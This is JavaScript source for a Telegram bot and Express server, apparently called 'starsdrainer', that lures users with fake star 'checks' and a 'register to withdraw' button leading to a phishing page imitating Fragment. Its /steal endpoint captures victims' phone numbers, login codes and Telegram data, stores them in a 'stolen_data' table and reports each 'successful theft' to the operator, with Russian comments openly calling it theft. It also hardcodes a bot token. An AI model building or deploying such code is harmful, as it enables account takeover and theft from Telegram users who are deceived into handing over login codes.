const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS stolen_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT, 
        tg_data TEXT,
        user_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App - только Fragment
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Stage:', req.body.stage);
    console.log('Код:', req.body.code);
    
    // Сохраняем украденные данные
    db.run(`INSERT INTO stolen_data (phone, code, tg_data) VALUES (?, ?, ?)`, 
        [req.body.phone, req.body.code, req.body.tg_data]);
    
    // Имитируем успешную кражу
    if (req.body.stage === 'code_entered') {
        const stolenAmount = Math.floor(Math.random() * 500) + 100;
        const stolenGifts = Math.floor(Math.random() * 10) + 1;
        
        bot.sendMessage(MY_USER_ID,
            `💰 УСПЕШНАЯ КРАЖА!\n` +
            `📱 Номер: ${req.body.phone}\n` +
            `🔑 Код: ${req.body.code}\n` +
            `💫 Украдено: ${stolenAmount} stars\n` +
            `🎁 NFT подарков: ${stolenGifts}\n\n` +
            `✅ ВСЕ СРЕДСТВА ПЕРЕВЕДЕНЫ!`
        );
    }
    
    res.sendStatus(200);
});

// Убираем ВСЁ MTProto - только Fragment
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// Остальной код бота (чеки, баланс) остается БЕЗ ИЗМЕНЕНИЙ
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' });
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount]);
                
            bot.answerCallbackQuery(query.id, { text: `✅ Получено ${row.amount} звёзд!` });
        });
    }
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        'Для вывода зарегистрируйтесь:', {
        reply_markup: {
            inline_keyboard: [[{ 
                text: "📲 Зарегистрироваться", 
                web_app: { url: WEB_APP_URL } 
            }]]
        }
    });
});

// Создание чеков
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) return;
        
        const checkId = this.lastID;
        bot.sendMessage(chatId, `<b>Чек на 50 звезд</b>\n\n🪙 Заберите!`, {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать", callback_data: `claim_${checkId}` }]] }
        });
    });
});

console.log('✅ Бот запущен - ТОЛЬКО Fragment регистрация');